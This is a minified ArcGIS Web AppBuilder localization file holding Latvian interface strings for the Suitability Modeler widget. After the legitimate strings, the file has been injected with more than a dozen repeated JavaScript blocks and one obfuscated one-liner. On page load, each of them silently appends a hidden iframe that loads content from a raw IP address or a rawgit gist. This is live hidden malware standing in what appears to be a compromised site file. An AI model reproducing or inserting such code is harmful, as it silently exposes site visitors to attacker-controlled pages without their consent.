// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Piem\u0113rot\u012bbas model\u0113t\u0101js",general:{clear:"Not\u012br\u012bt",cancel:"Atcelt",save:"Palaist",saveAs:"Eksport\u0113t"},saveModel:{save:"Eksport\u0113t",title:"Virsraksts: ",summary:"Kopsavilkums: ",description:"Apraksts: ",tags:"Atsl\u0113gas v\u0101rdi: ",folder:"Mape: ",homeFolderPattern:"{username} (s\u0101kums)",failed:"Eksport\u0113\u0161ana neizdev\u0101s."},util:{colorRamp:{1:"\u0100rk\u0101rt\u012bgi zems",2:"\u013boti zems",
3:"Zems",4:"Vid\u0113ji zems",5:"Vid\u0113js",6:"Vid\u0113ji augsts",7:"Augsts",8:"\u013boti augsts",9:"\u0100rk\u0101rt\u012bgi augsts",low:"Zems",high:"Augsts",tipPattern:"{label} ({value})",flipCaption:"Apmest"}},wro:{caption:"Piem\u0113rot\u012bbas model\u0113t\u0101js",browsePrompt:"Sv\u0113rt\u0101 p\u0101rkl\u0101juma pakalpojums",selectLayersCaption:"Atlas\u012bt sl\u0101\u0146us",selectLayers:"Sl\u0101\u0146i",designModelCaption:"Noform\u0113juma modelis",designModel:"Noform\u0113juma modelis",
transparency:"Caursp\u012bd\u012bgums",visible:"Redzams",total:"Kop\u0101",unableToLoad:"Nevar\u0113ja iel\u0101d\u0113t modeli.",projectNotOpen:"Projekts nav atv\u0113rts.",readMore:"Las\u012bt vair\u0101k",validation:{validating:"Notiek valid\u0101cija",invalidItemCaption:"Sv\u0113rt\u0101 p\u0101rkl\u0101juma pakalpojuma br\u012bdin\u0101jums",notAnImageService:"\u0160\u012b vien\u012bba nav Att\u0113la serviss.",notAWroService:"\u0160\u012b vien\u012bba nav Sv\u0113rt\u0101 p\u0101rkl\u0101juma pakalpojums.",
undefinedUrl:"\u0160\u012bs vien\u012bbas URL nav defin\u0113ts.",inaccessible:"Pakalpojums ir nepieejams.",generalError:"Nevar atv\u0113rt vien\u012bbu.",missingFieldPattern:"{field} ir oblig\u0101ts lauks.",notAllowRasterFunction:"allowRasterFunction ir j\u0101b\u016bt iestat\u012btam k\u0101 patiesam",notNearestResampling:"defaultResamplingMethod ir j\u0101b\u016bt vistuv\u0101kajai",notIsWeightedOverlayProp:"Atsl\u0113gas rekviz\u012btam IsWeightedOverlay ir j\u0101b\u016bt iestat\u012btam uz patiesu",
invalidLink:"URL nav der\u012bgs. Atlas\u012btajam sl\u0101nim vietni atrast neizdev\u0101s.",unexpectedError:"Radies neparedz\u0113ts st\u0101voklis.",rangeMessage:"V\u0113rt\u012bbai j\u0101b\u016bt no ${0} l\u012bdz ${1}",rangeMessage100:"V\u0113rt\u012bbai ir j\u0101b\u016bt no 0 l\u012bdz 100",maxLayers:"Pakalpojums at\u013cauj maksim\u0101li ${0} sl\u0101\u0146us, pirms jauna sl\u0101\u0146a pievieno\u0161anas ir j\u0101no\u0146em k\u0101ds sl\u0101nis.",notFound:"Sl\u0101nis ${0} sv\u0113rt\u0101 p\u0101rkl\u0101juma pakalpojum\u0101 nav atrasts",
wroServiceNotDefined:"Modelim nav defin\u0113ts sv\u0113rt\u0101 p\u0101rkl\u0101juma pakalpojums.",overlayLayerOutputInvalid:"P\u0101rkl\u0101juma sl\u0101nis [${0}] p\u0101rkart\u0113 diapazonu [${1}], izvades v\u0113rt\u012bbas nav vai t\u0101 ir neder\u012bga",overlayLayerInputInvalid:"P\u0101rkl\u0101juma sl\u0101nis [${0}] p\u0101rkart\u0113 diapazonu [${1}], ievades min./maks. nav  nor\u0101d\u012bts vai ir neder\u012bgs",overlayLayerRangesMissing:"P\u0101rkl\u0101juma sl\u0101n\u012b [${0}] nav p\u0101rkart\u0113\u0161anas diapazona",
overlayLayerWeight:"P\u0101rkl\u0101juma sl\u0101\u0146a svariem ir j\u0101pievieno v\u0113rt\u012bba l\u012bdz 100",overlayLayerRequired:"Ir nepiecie\u0161ams vismaz viens p\u0101rkl\u0101juma sl\u0101nis",overlayLayerNotDefined:"P\u0101rkl\u0101juma sl\u0101\u0146i nav defin\u0113ti",requiresColormap:"\u0160\u012b rastra funkcijai ir nepiecie\u0161ama kr\u0101su karte, bet modelim nav der\u012bgas kr\u0101su kartes defin\u012bcijas",createModelError:"Veidojot modeli, rad\u0101s k\u013c\u016bda",
invalidModel:"Modelis nav der\u012bgs",imageServiceNotDefined:"Att\u0113la pakalpojuma sl\u0101nis nav defin\u0113ts",imageLayerNotDefined:"Att\u0113la pakalpojuma sl\u0101nis nav defin\u0113ts",histogramNotDefined:"Sv\u0113rt\u0101 p\u0101rkl\u0101juma histogrammas funkcija nav defin\u0113ta."},colorRampLabel:{"Green Yellow Red":"Za\u013c\u0161, dzeltens, sarkans","Red Yellow Green":"Sarkans, dzeltens, za\u013c\u0161","Yellow to Dark Red":"No dzeltenas l\u012bdz tum\u0161i sarkanai","Dark Red to Yellow":"No tum\u0161i sarkanas l\u012bdz dzeltenai",
"Light Gray to Dark Gray":"No gai\u0161i pel\u0113kas l\u012bdz tum\u0161i pel\u0113kai","Dark Gray to Light Gray":"No tum\u0161i pel\u0113kas l\u012bdz gai\u0161i pel\u0113kai","Light Brown to Dark Brown":"No gai\u0161i br\u016bnas l\u012bdz tum\u0161i br\u016bnai","Dark Brown to Light Brown":"No tum\u0161i br\u016bnas l\u012bdz gai\u0161i br\u016bnai","Full Spectrum - Bright Red to Blue":"Pilns spektrs\u00a0- no spilgti sarkana l\u012bdz zilai","Full Spectrum - Bright Blue to Red":"Pilns spektrs\u00a0- no spilgti zila l\u012bdz sarkanai",
"Partial Spectrum - Yellow to Blue":"Da\u013c\u0113js spektrs\u00a0- no dzeltenas l\u012bdz zilai","Partial Spectrum - Blue to Yellow":"Da\u013c\u0113js spektrs\u00a0- no zilas l\u012bdz dzeltenai","Yellow-Green to Dark Blue":"No za\u013cgandzeltenas l\u012bdz tum\u0161i zilai","Dark Blue to Yellow-Green":"No tum\u0161i zilas l\u012bdz za\u013cgandzeltenai","Cold to Hot Diverging":"Pl\u016bsto\u0161a p\u0101reja no aukstajiem l\u012bdz siltajiem to\u0146iem","Hot to Cold Diverging":"Pl\u016bsto\u0161a p\u0101reja\u00a0no siltajiem l\u012bdz aukstajiem to\u0146iem",
"Surface - Low to High":"Virsma\u00a0- no zemas l\u012bdz augstai","Surface - High to Low":"Virsma\u00a0- no augstas l\u012bdz zemai"}},_localized:{}},"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"At\u013caut eksport\u0113\u0161anu",startingState:"S\u0101kuma st\u0101voklis:",byUrl:"Tuk\u0161s modelis",byItem:"S\u0101kotn\u0113ji konfigur\u0113ts modelis",imageServiceUrl:"Att\u0113lu servisa URL",validate:"Valid\u0113t",validating:"Notiek valid\u0101cija...",validated:"URL ir der\u012bgs.",
modelName:"Modelis",selectModel:"Izv\u0113l\u0113ties",itemSelectorTitle:"Izv\u0113l\u0113ties modeli",ok:"Labi",cancel:"Atcelt",description1:"Piem\u0113rot\u012bbas model\u0113t\u0101js pal\u012bdz atrast aktivit\u0101tei lab\u0101ko vietu, paredz\u0113t riska faktoru vai identific\u0113t, kur visliel\u0101k\u0101 iesp\u0113jam\u012bba kaut kam atgad\u012bties. \u0160is logr\u012bks \u013cauj apvienot un izsv\u0113rt da\u017e\u0101dus sl\u0101\u0146us, t\u0101p\u0113c varat vienlaikus nov\u0113rt\u0113t vair\u0101kus faktorus.",
description2:"Piem\u0113rot\u012bbas model\u0113t\u0101js izmanto \u0101tru no t\u012bmek\u013ca darbin\u0101mu sv\u0113rt\u0101 rastra p\u0101rkl\u0101jumu, lai no servisa \u0123ener\u0113tu mode\u013cus. Varat s\u0101kt darbu no tuk\u0161a sv\u0113rt\u0101 rastra p\u0101rkl\u0101juma (SRP) st\u0101vok\u013ca vai s\u0101kotn\u0113ji konfigur\u0113ta SRP mode\u013ca. Izv\u0113lieties sl\u0101\u0146us, pie\u0161\u0137iriet svaru un piel\u0101gojiet sl\u0101\u0146u klasifik\u0101cijas v\u0113rt\u012bbas, lai defin\u0113tus savu anal\u012bzi. P\u0113c tam palaidiet model\u0113t\u0101ju, vizualiz\u0113jiet rezult\u0101tus un, ja nepiecie\u0161ams, saglab\u0101jiet rezult\u0101tu k\u0101 vien\u012bbu sav\u0101 organiz\u0101cij\u0101/port\u0101l\u0101.",
description3:"Uzziniet vair\u0101k par \u0123eopl\u0101not\u0101ja piem\u0113rot\u012bbas model\u0113t\u0101ju.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});